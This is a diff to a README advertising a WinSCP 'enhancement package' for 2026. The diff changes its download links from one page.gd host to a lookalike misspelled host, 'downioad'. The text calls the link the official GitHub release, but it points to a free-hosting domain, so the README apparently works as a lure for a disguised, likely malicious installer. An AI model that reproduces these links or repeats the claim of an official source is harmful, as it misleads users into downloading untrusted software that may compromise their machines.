@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive enhancement package for WinSCP, the popular Windows file transfer client. Designed for the 2026 release, this suite unlocks additional productivity features, expands customization options, and streamlines workflow for both casual users and system administrators.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features & Enhancements
 
@@ -61,7 +61,7 @@ A: You can use the standard 'Add or remove programs' feature in Windows Settings
 
 The complete, ready-to-install package is available from the official release source.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
